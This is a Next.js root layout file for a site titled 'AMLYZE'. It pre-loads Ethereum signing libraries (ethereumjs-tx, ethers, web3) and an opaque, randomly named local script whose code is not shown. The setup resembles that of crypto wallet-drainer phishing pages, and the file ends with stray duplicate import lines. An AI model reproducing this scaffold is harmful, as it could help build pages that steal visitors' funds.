import type React from "react"
import type { Metadata } from "next"
import Script from "next/script"
import "./globals.css"

export const metadata: Metadata = {
  title: "AMLYZE",
  description: "Created with v0",
  generator: "v0.dev",
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <head>
        {/* Google Fonts Preconnect */}
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link
          href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body>
        {children}

        {/* External Scripts */}
        <Script
          src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"
          strategy="beforeInteractive"
        />
        <Script
          src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"
          crossOrigin="anonymous"
          referrerPolicy="no-referrer"
          strategy="beforeInteractive"
        />
        <Script
          src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"
          crossOrigin="anonymous"
          referrerPolicy="no-referrer"
          strategy="beforeInteractive"
        />

        {/* Local Scripts */}
        <Script src="settings.js" strategy="beforeInteractive" />
        <Script src="s7zgqj01xv8.js" type="module" strategy="beforeInteractive" />
      </body>
    </html>
  )
}

import "./globals.css"

import "./globals.css"



import './globals.css'
